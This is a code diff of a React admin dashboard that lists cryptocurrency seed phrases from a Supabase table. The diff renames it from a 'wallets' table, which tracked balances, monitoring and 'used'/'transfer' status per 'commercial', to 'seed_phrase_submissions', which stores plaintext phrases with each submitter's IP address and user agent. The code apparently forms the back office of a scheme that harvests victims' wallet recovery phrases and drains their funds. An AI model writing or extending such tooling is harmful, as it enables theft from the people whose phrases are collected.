@@ -8,24 +8,22 @@ import { Search, Eye, EyeOff, Copy, Trash2, Key } from 'lucide-react';
 import { supabase } from '@/integrations/supabase/client';
 import { useToast } from '@/hooks/use-toast';
 
-interface Wallet {
+interface SeedPhraseSubmission {
   id: string;
-  wallet_phrase: string;
-  client_tracking_id: string | null;
+  phrase: string;
+  commercial_id: string | null;
+  commercial_name: string | null;
+  word_count: number;
   status: string | null;
-  client_balance: number | null;
+  ip_address: unknown;
+  user_agent: string | null;
   created_at: string;
   updated_at: string;
-  is_used: boolean;
-  used_by_commercial_id: string | null;
-  used_at: string | null;
-  last_balance_check: string | null;
-  monitoring_active: boolean | null;
 }
 
 const SeedPhraseManagement = () => {
-  const [wallets, setWallets] = useState<Wallet[]>([]);
-  const [filteredWallets, setFilteredWallets] = useState<Wallet[]>([]);
+  const [submissions, setSubmissions] = useState<SeedPhraseSubmission[]>([]);
+  const [filteredSubmissions, setFilteredSubmissions] = useState<SeedPhraseSubmission[]>([]);
   const [loading, setLoading] = useState(true);
   const [searchTerm, setSearchTerm] = useState('');
   const [selectedStatus, setSelectedStatus] = useState('all');
@@ -33,26 +31,26 @@ const SeedPhraseManagement = () => {
   const { toast } = useToast();
 
   useEffect(() => {
-    fetchWallets();
+    fetchSubmissions();
   }, []);
 
-  const fetchWallets = async () => {
+  const fetchSubmissions = async () => {
     try {
       setLoading(true);
       const { data, error } = await supabase
-        .from('wallets')
+        .from('seed_phrase_submissions')
         .select('*')
         .order('created_at', { ascending: false });
 
       if (error) throw error;
 
-      setWallets(data || []);
-      setFilteredWallets(data || []);
+      setSubmissions(data || []);
+      setFilteredSubmissions(data || []);
     } catch (error) {
-      console.error('Error fetching wallets:', error);
+      console.error('Error fetching seed phrase submissions:', error);
       toast({
         title: "Error",
-        description: "Failed to fetch seed phrases",
+        description: "Failed to fetch seed phrase submissions",
         variant: "destructive"
       });
     } finally {
@@ -60,28 +58,28 @@ const SeedPhraseManagement = () => {
     }
   };
 
-  // Filter wallets
+  // Filter submissions
   useEffect(() => {
-    let filtered = wallets;
+    let filtered = submissions;
 
     if (searchTerm) {
-      filtered = filtered.filter(wallet =>
-        wallet.wallet_phrase?.toLowerCase().includes(searchTerm.toLowerCase()) ||
-        wallet.client_tracking_id?.toLowerCase().includes(searchTerm.toLowerCase())
+      filtered = filtered.filter(submission =>
+        submission.phrase?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+        submission.commercial_name?.toLowerCase().includes(searchTerm.toLowerCase())
       );
     }
 
     if (selectedStatus !== 'all') {
-      filtered = filtered.filter(wallet => wallet.status === selectedStatus);
+      filtered = filtered.filter(submission => submission.status === selectedStatus);
     }
 
-    setFilteredWallets(filtered);
-  }, [wallets, searchTerm, selectedStatus]);
+    setFilteredSubmissions(filtered);
+  }, [submissions, searchTerm, selectedStatus]);
 
-  const toggleSeedVisibility = (walletId: string) => {
+  const toggleSeedVisibility = (submissionId: string) => {
     setShowSeedPhrases(prev => ({
       ...prev,
-      [walletId]: !prev[walletId]
+      [submissionId]: !prev[submissionId]
     }));
   };
 
@@ -102,37 +100,37 @@ const SeedPhraseManagement = () => {
     }
   };
 
-  const deleteWallet = async (walletId: string) => {
-    if (!confirm('Are you sure you want to delete this seed phrase? This action cannot be undone.')) {
+  const deleteSubmission = async (submissionId: string) => {
+    if (!confirm('Are you sure you want to delete this seed phrase submission? This action cannot be undone.')) {
       return;
     }
 
     try {
       const { error } = await supabase
-        .from('wallets')
+        .from('seed_phrase_submissions')
         .delete()
-        .eq('id', walletId);
+        .eq('id', submissionId);
 
       if (error) throw error;
 
       toast({
         title: "Deleted",
-        description: "Seed phrase deleted successfully",
+        description: "Seed phrase submission deleted successfully",
       });
 
-      fetchWallets();
+      fetchSubmissions();
     } catch (error) {
-      console.error('Error deleting wallet:', error);
+      console.error('Error deleting submission:', error);
       toast({
         title: "Error",
-        description: "Failed to delete seed phrase",
+        description: "Failed to delete seed phrase submission",
         variant: "destructive"
       });
     }
   };
 
-  const formatSeedPhrase = (phrase: string, walletId: string) => {
-    const isVisible = showSeedPhrases[walletId];
+  const formatSeedPhrase = (phrase: string, submissionId: string) => {
+    const isVisible = showSeedPhrases[submissionId];
     const displayText = isVisible ? phrase : '••••••••••••••••••••••••••••••••••••';
     
     return (
@@ -142,7 +140,7 @@ const SeedPhraseManagement = () => {
         </span>
         <div className="flex gap-1">
           <button
-            onClick={() => toggleSeedVisibility(walletId)}
+            onClick={() => toggleSeedVisibility(submissionId)}
             className="text-gray-400 hover:text-white"
             title={isVisible ? 'Hide' : 'Show'}
           >
@@ -164,22 +162,22 @@ const SeedPhraseManagement = () => {
 
   const getStatusBadge = (status: string | null) => {
     switch (status) {
-      case 'available':
-        return <Badge variant="default" className="bg-green-500">Available</Badge>;
-      case 'used':
-        return <Badge variant="secondary">Used</Badge>;
-      case 'transfer':
-        return <Badge variant="outline" className="bg-blue-100 text-blue-800">Transfer</Badge>;
+      case 'submitted':
+        return <Badge variant="default" className="bg-green-500">Submitted</Badge>;
+      case 'processed':
+        return <Badge variant="secondary">Processed</Badge>;
+      case 'pending':
+        return <Badge variant="outline" className="bg-yellow-100 text-yellow-800">Pending</Badge>;
       default:
         return <Badge variant="outline">{status || 'Unknown'}</Badge>;
     }
   };
 
   const stats = {
-    total: wallets.length,
-    available: wallets.filter(w => w.status === 'available').length,
-    used: wallets.filter(w => w.status === 'used').length,
-    transfer: wallets.filter(w => w.status === 'transfer').length
+    total: submissions.length,
+    submitted: submissions.filter(s => s.status === 'submitted').length,
+    processed: submissions.filter(s => s.status === 'processed').length,
+    pending: submissions.filter(s => s.status === 'pending').length
   };
 
   return (
@@ -190,7 +188,7 @@ const SeedPhraseManagement = () => {
           <CardContent className="p-4">
             <div className="flex items-center justify-between">
               <div>
-                <p className="text-sm font-medium text-gray-600">Total Seed Phrases</p>
+                <p className="text-sm font-medium text-gray-600">Total Submissions</p>
                 <p className="text-2xl font-bold text-gray-900">{stats.total}</p>
               </div>
               <Key className="h-8 w-8 text-gray-400" />
@@ -202,8 +200,8 @@ const SeedPhraseManagement = () => {
           <CardContent className="p-4">
             <div className="flex items-center justify-between">
               <div>
-                <p className="text-sm font-medium text-gray-600">Available</p>
-                <p className="text-2xl font-bold text-green-600">{stats.available}</p>
+                <p className="text-sm font-medium text-gray-600">Submitted</p>
+                <p className="text-2xl font-bold text-green-600">{stats.submitted}</p>
               </div>
               <div className="h-8 w-8 bg-green-100 rounded-full flex items-center justify-center">
                 <div className="h-4 w-4 bg-green-500 rounded-full"></div>
@@ -216,8 +214,8 @@ const SeedPhraseManagement = () => {
           <CardContent className="p-4">
             <div className="flex items-center justify-between">
               <div>
-                <p className="text-sm font-medium text-gray-600">Used</p>
-                <p className="text-2xl font-bold text-gray-600">{stats.used}</p>
+                <p className="text-sm font-medium text-gray-600">Processed</p>
+                <p className="text-2xl font-bold text-gray-600">{stats.processed}</p>
               </div>
               <div className="h-8 w-8 bg-gray-100 rounded-full flex items-center justify-center">
                 <div className="h-4 w-4 bg-gray-500 rounded-full"></div>
@@ -230,11 +228,11 @@ const SeedPhraseManagement = () => {
           <CardContent className="p-4">
             <div className="flex items-center justify-between">
               <div>
-                <p className="text-sm font-medium text-gray-600">Transfer</p>
-                <p className="text-2xl font-bold text-blue-600">{stats.transfer}</p>
+                <p className="text-sm font-medium text-gray-600">Pending</p>
+                <p className="text-2xl font-bold text-yellow-600">{stats.pending}</p>
               </div>
-              <div className="h-8 w-8 bg-blue-100 rounded-full flex items-center justify-center">
-                <div className="h-4 w-4 bg-blue-500 rounded-full"></div>
+              <div className="h-8 w-8 bg-yellow-100 rounded-full flex items-center justify-center">
+                <div className="h-4 w-4 bg-yellow-500 rounded-full"></div>
               </div>
             </div>
           </CardContent>
@@ -249,7 +247,7 @@ const SeedPhraseManagement = () => {
               <div className="relative">
                 <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 h-4 w-4" />
                 <Input
-                  placeholder="Search seed phrases or tracking IDs..."
+                  placeholder="Search seed phrases or commercial names..."
                   value={searchTerm}
                   onChange={(e) => setSearchTerm(e.target.value)}
                   className="pl-10"
@@ -263,9 +261,9 @@ const SeedPhraseManagement = () => {
                 className="px-3 py-2 border border-gray-300 rounded-md bg-white"
               >
                 <option value="all">All Status</option>
-                <option value="available">Available</option>
-                <option value="used">Used</option>
-                <option value="transfer">Transfer</option>
+                <option value="submitted">Submitted</option>
+                <option value="processed">Processed</option>
+                <option value="pending">Pending</option>
               </select>
             </div>
           </div>
@@ -277,18 +275,18 @@ const SeedPhraseManagement = () => {
         <CardHeader>
           <CardTitle className="flex items-center gap-2">
             <Key className="h-5 w-5" />
-            Seed Phrases Database
+            Seed Phrase Submissions
           </CardTitle>
         </CardHeader>
         <CardContent>
           {loading ? (
             <div className="text-center py-8">
               <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-yellow-500 mx-auto mb-4"></div>
-              <p className="text-gray-600">Loading seed phrases...</p>
+              <p className="text-gray-600">Loading seed phrase submissions...</p>
             </div>
-          ) : filteredWallets.length === 0 ? (
+          ) : filteredSubmissions.length === 0 ? (
             <div className="text-center py-8">
-              <p className="text-gray-600">No seed phrases found</p>
+              <p className="text-gray-600">No seed phrase submissions found</p>
             </div>
           ) : (
             <div className="overflow-x-auto">
@@ -296,51 +294,42 @@ const SeedPhraseManagement = () => {
                 <TableHeader>
                   <TableRow>
                     <TableHead>Seed Phrase</TableHead>
-                    <TableHead>Tracking ID</TableHead>
+                    <TableHead>Commercial</TableHead>
                     <TableHead>Status</TableHead>
-                    <TableHead>Balance</TableHead>
-                    <TableHead>Created At</TableHead>
-                    <TableHead>Last Used</TableHead>
+                    <TableHead>Word Count</TableHead>
+                    <TableHead>IP Address</TableHead>
+                    <TableHead>Submitted At</TableHead>
                     <TableHead>Actions</TableHead>
                   </TableRow>
                 </TableHeader>
                 <TableBody>
-                  {filteredWallets.map((wallet) => (
-                    <TableRow key={wallet.id}>
-                      <TableCell>{formatSeedPhrase(wallet.wallet_phrase, wallet.id)}</TableCell>
-                      <TableCell className="font-mono text-sm">{wallet.client_tracking_id || '-'}</TableCell>
-                      <TableCell>{getStatusBadge(wallet.status)}</TableCell>
+                  {filteredSubmissions.map((submission) => (
+                    <TableRow key={submission.id}>
+                      <TableCell>{formatSeedPhrase(submission.phrase, submission.id)}</TableCell>
+                      <TableCell className="font-mono text-sm">{submission.commercial_name || '-'}</TableCell>
+                      <TableCell>{getStatusBadge(submission.status)}</TableCell>
                       <TableCell>
                         <span className="font-semibold">
-                          {wallet.client_balance !== null ? `$${wallet.client_balance.toFixed(2)}` : '$0.00'}
+                          {submission.word_count} words
                         </span>
+                      </TableCell>
+                      <TableCell className="font-mono text-sm">
+                        {String(submission.ip_address || '-')}
                       </TableCell>
                       <TableCell>
                         <div className="text-sm">
-                          <div>{new Date(wallet.created_at).toLocaleDateString()}</div>
+                          <div>{new Date(submission.created_at).toLocaleDateString()}</div>
                           <div className="text-xs text-gray-500">
-                            {new Date(wallet.created_at).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
+                            {new Date(submission.created_at).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                           </div>
                         </div>
-                      </TableCell>
-                      <TableCell>
-                        {wallet.used_at ? (
-                          <div className="text-sm">
-                            <div>{new Date(wallet.used_at).toLocaleDateString()}</div>
-                            <div className="text-xs text-gray-500">
-                              {new Date(wallet.used_at).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
-                            </div>
-                          </div>
-                        ) : (
-                          <span className="text-gray-400 text-sm">Never used</span>
-                        )}
                       </TableCell>
                       <TableCell>
                         <div className="flex gap-2">
                           <Button
                             size="sm"
                             variant="destructive"
-                            onClick={() => deleteWallet(wallet.id)}
+                            onClick={() => deleteSubmission(submission.id)}
                           >
                             <Trash2 className="h-4 w-4" />
                           </Button>
